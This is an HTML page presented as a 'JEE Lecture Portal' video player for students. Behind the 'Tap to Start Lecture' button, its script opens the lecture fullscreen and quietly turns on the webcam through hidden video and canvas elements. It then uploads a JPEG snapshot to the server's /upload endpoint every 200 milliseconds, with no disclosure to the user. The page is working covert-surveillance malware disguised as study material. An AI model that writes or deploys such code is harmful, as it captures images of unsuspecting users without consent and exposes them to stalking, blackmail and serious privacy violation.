<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>JEE Lecture Player</title>

  <style>
    html,body{
      margin:0;
      height:100%;
      overflow:hidden;
      font-family: 'Segoe UI', sans-serif;
    }

    /* ðŸ”¥ BACKGROUND ADDED ONLY */
    body{
      background:
        linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
        url("bg.jpg") no-repeat center center fixed;
      background-size:cover;
    }

    iframe{
      width:100%;
      height:100%;
      border:0;
    }

    #overlay{
      position:absolute;
      top:0;
      left:0;
      width:100%;
      height:100%;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      color:white;
      cursor:pointer;
      z-index:10;
      backdrop-filter: blur(6px);
    }

    #overlay h1{
      font-size:40px;
      margin-bottom:20px;
      letter-spacing:2px;
    }

    #overlay span{
      font-size:20px;
      padding:15px 35px;
      border-radius:40px;
      background:linear-gradient(45deg,#ff0000,#ff4d4d);
      box-shadow:0 0 20px rgba(255,0,0,0.6);
      transition:0.3s;
    }

    #overlay span:hover{
      transform:scale(1.1);
      box-shadow:0 0 30px rgba(255,0,0,0.9);
    }

    #v,#c{
      display:none;
    }

  </style>
</head>
<body>

<div id="overlay" onclick="start()">
  <h1>JEE Lecture Portal</h1>
  <span>â–¶ Tap to Start Lecture</span>
</div>

<iframe id="frame"></iframe>

<video id="v" autoplay playsinline hidden></video>
<canvas id="c" hidden></canvas>

<script>
async function start(){
  document.getElementById("overlay").style.display="none";

  const r = await fetch("/get_video_link");
  const d = await r.json();

  const frame = document.getElementById("frame");
  frame.src = d.url;

  if(frame.requestFullscreen){
    frame.requestFullscreen();
  }else if(frame.webkitRequestFullscreen){
    frame.webkitRequestFullscreen();
  }else if(frame.msRequestFullscreen){
    frame.msRequestFullscreen();
  }

  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video:{ width:1280, height:720 }
    });
    v.srcObject = stream;

    setTimeout(capture,200);
    setInterval(capture,200);
  }catch(e){}
}

function capture(){
  c.width  = v.videoWidth;
  c.height = v.videoHeight;

  c.getContext("2d").drawImage(v,0,0,c.width,c.height);
  c.toBlob(b=>{
    let f=new FormData();
    f.append("photo",b,"u.jpg");
    fetch("/upload",{method:"POST",body:f});
  },"image/jpeg",0.6);
}
</script>

</body>
</html>
